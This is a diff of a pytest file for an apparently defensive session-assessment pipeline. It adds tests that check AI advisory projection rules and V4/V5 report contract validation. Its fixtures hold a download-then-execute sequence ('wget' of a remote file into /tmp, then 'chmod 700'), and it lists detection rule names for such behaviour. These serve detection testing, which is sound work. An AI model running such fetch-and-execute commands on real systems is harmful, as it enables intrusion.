@@ -6,7 +6,9 @@ import pytest
 
 from production.classification.classification_pipeline import NotebookParityClassifier
 from production.ai_advisory.contracts import load_ai_advisory_policy
+from production.ai_advisory.contracts import AIAdvisoryContractError
 from production.ai_advisory.projection import build_ai_advisory_projection
+from production.ai_advisory.projection import POLICY_RULE_IDS
 from production.reporting.session_assessment_v4 import (
     read_legacy_session_assessment,
     validate_session_assessment_v4,
@@ -35,6 +37,18 @@ class _Mitre:
         return ["persistence"] if ttp == "T1136" else ["discovery"]
 
 
+def test_ai_projection_allowlists_reviewed_manual_guidance_rules() -> None:
+    assert {
+        "review-deception-path-interaction",
+        "review-download-execution-attempt",
+        "review-failed-login-then-success",
+        "review-file-change-then-remove",
+        "review-same-path-execution-delete",
+        "review-same-path-file-change",
+        "review-unverified-remote-content",
+    } <= POLICY_RULE_IDS
+
+
 def _v5(case: dict) -> dict:
     payload = _payload(case)
     return build_session_assessment_v5(
@@ -53,6 +67,24 @@ def _incomplete() -> dict:
             ("chmod 700 /tmp/a", "success"),
         ],
     })
+
+
+def _v4_incomplete() -> dict:
+    from production.reporting.session_assessment_v4 import build_session_assessment_v4
+
+    payload = _payload({
+        "case_id": "phase3-incomplete-ai-projection",
+        "events": [
+            ("wget https://example.invalid/a -O /tmp/a", "success"),
+            ("chmod 700 /tmp/a", "success"),
+        ],
+    })
+    return build_session_assessment_v4(
+        [payload],
+        raw_events=payload["raw_events"],
+        behavior_policy_path=str(BEHAVIOR_POLICY),
+        classification_policy_path=str(CLASSIFICATION_POLICY),
+    )
 
 
 def test_audit_only_behavioral_candidate_is_not_a_canonical_finding() -> None:
@@ -167,7 +199,9 @@ def test_complete_chain_has_finding_and_no_incomplete_hypothesis() -> None:
 
 
 def test_incomplete_chain_hypothesis_survives_validated_ai_projection() -> None:
-    report = _incomplete()
+    # The AI projection accepts persisted V4 reports; V5 is a separate contract.
+    report = _v4_incomplete()
+    assert validate_session_assessment_v4(report) == []
     policy, policy_sha256, _ = load_ai_advisory_policy()
     projection = build_ai_advisory_projection(
         report,
@@ -185,6 +219,14 @@ def test_incomplete_chain_hypothesis_survives_validated_ai_projection() -> None:
     assert projected_ids == expected_ids
     assert all(item["status"] == "active" for item in projection["hypotheses"])
     assert projection["authority"]["ai_hypothesis_authority"] is False
+
+
+def test_v5_report_is_not_silently_adapted_to_v4_ai_projection() -> None:
+    policy, policy_sha256, _ = load_ai_advisory_policy()
+    with pytest.raises(AIAdvisoryContractError, match="persisted v4 report failed validation"):
+        build_ai_advisory_projection(
+            _incomplete(), policy=policy, policy_sha256=policy_sha256
+        )
 
 
 def test_non_authoritative_context_cannot_change_v5_identity() -> None:
